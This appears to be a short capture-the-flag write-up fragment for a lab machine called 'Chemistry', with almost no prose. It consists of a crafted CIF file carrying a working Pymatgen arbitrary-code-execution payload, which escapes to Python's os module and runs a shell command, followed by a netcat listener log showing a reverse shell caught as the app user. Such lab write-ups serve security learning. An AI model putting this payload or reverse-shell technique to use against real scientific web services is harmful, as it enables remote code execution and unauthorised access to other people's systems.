## Chemistry

```
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("touch pwned");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```



```
[★]$ rlwrap nc -lvnp 9090
listening on [any] 9090 ...
connect to [10.10.14.56] from (UNKNOWN) [10.129.231.170] 45440
bash: cannot set terminal process group (1023): Inappropriate ioctl for device
bash: no job control in this shell
app@chemistry:~$ id
id
uid=1001(app) gid=1001(app) groups=1001(app)
app@chemistry:~$ ls -la
ls -la
total 52
drwxr-xr-x 8 app  app  4096 Oct  9  2024 .
drwxr-xr-x 4 root root 4096 Jun 16  2024 ..
-rw------- 1 app  app  5852 Oct  9  2024 app.py
lrwxrwxrwx 1 root root    9 Jun 17  2024 .bash_history -> /dev/null
-rw-r--r-- 1 app  app   220 Jun 15  2024 .bash_logout
-rw-r--r-- 1 app  app  3771 Jun 15  2024 .bashrc
drwxrwxr-x 3 app  app  4096 Jun 17  2024 .cache
drwx------ 2 app  app  4096 Sep  2 09:31 instance
drwx------ 7 app  app  4096 Jun 15  2024 .local
-rw-r--r-- 1 app  app   807 Jun 15  2024 .profile
lrwxrwxrwx 1 root root    9 Jun 17  2024 .sqlite_history -> /dev/null
drwx------ 2 app  app  4096 Oct  9  2024 static
drwx------ 2 app  app  4096 Oct  9  2024 templates
drwx------ 2 app  app  4096 Sep  2 09:31 uploads
app@chemistry:~$ 
```
